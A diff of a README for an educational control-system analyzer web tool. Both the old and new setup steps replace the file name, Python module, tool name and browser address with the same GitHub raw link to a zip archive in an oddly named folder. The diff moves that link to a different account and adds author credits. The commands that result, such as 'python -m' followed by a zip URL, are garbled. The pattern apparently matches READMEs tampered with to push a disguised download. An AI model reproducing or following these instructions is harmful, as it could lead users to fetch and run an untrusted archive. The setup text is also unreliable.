@@ -1,4 +1,5 @@
 # 🎛️ Advanced Control System Analyzer
+Dr. Upesh Patel, Dr. Tigmanshu Patel
 
 An interactive web-based tool for analyzing and visualizing control system responses. Built to help students understand fundamental control system concepts through visual demonstrations.
 
@@ -67,21 +68,21 @@ This tool provides interactive analysis of control systems including:
    
    Using VS Code Live Server:
    - Install the "Live Server" extension
-   - Right-click on `https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip` → "Open with Live Server"
+   - Right-click on `https://github.com/tigmanshupatelec/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip` → "Open with Live Server"
    
    Or using Python:
    ```bash
-   python -m https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip 5500
+   python -m https://github.com/tigmanshupatelec/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip 5500
    ```
    
-   Or using https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
+   Or using https://github.com/tigmanshupatelec/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
    ```bash
    npx serve .
    ```
 
 3. **Open in browser:**
    ```
-   https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
+   https://github.com/tigmanshupatelec/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
    ```
 
 ## 📖 Usage Guide
